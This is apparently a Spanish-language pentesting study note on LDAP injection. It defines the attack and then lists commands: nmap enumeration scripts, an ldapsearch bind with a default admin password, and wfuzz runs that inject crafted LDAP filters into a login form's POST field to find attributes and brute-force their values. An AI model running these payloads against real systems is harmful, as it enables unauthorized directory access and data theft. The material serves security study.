#LDAPi #OWASP #Explotacion 

#### Definición
>Las inyecciones **LDAP** (**Protocolo de Directorio Ligero**) son un tipo de ataque en el que se aprovechan las vulnerabilidades en las aplicaciones web que interactúan con un servidor LDAP. El servidor LDAP es un directorio que se utiliza para almacenar información de usuarios y recursos en una red.
>
  La inyección LDAP funciona mediante la inserción de comandos LDAP maliciosos en los campos de entrada de una aplicación web, que luego son enviados al servidor LDAP para su procesamiento. Si la aplicación web no está diseñada adecuadamente para manejar la entrada del usuario, un atacante puede aprovechar esta debilidad para realizar operaciones no autorizadas en el servidor LDAP.

Para enumerarlo lo podemos hacer los los scripts que trae [[NMAP]]
`nmap -p- --script ldap\* <IP_Objetivo>  `

Nos dará información sobre el servicio aportándonos el `dc`, *LDAP* tiene un usuario llamado `admin` por defecto para poder sacar información sobre el usuario podemos usar la herramienta de [[LDAPSEARCH]]
`ldapsearch -x -H ldap://<IP_Victima> -b dc=example,dc=org -D "cn=admin,dc=example,dc=org" -w admin 'cn=admin'`

Para hacer fuerza bruta para la enumeración de usuarios, primero habría que hacer un descubrimiento de atributos.
Para eso usaremos [[WFUZZ]]

`wfuzz -c -w /home/jalag/Workzone/Herramientas/Wordlists/Seclist/Fuzzing/LDAP-openldap-attributes.txt -d 'user_id=admin)(FUZZ))%00&password=*&login=1&submit=Submit' http://<IP_Victima>` 
###### Desde la parte de 'user_id ....' Es el dato enviado por POST en BurpSuite

Una vez obtenido por ejemplo el atributo de `telefoneNumber` podemos descubrir cual es el valor que se aloja en el, podemos seguir usando [[WFUZZ]]
`wfuzz -c --hh=439 -z range,0-9 -d 'user_id=jalag)(telephoneNumber=FUZZ*))%00&password=*&login=1&submit=Submit' http://<IP_Victima>`

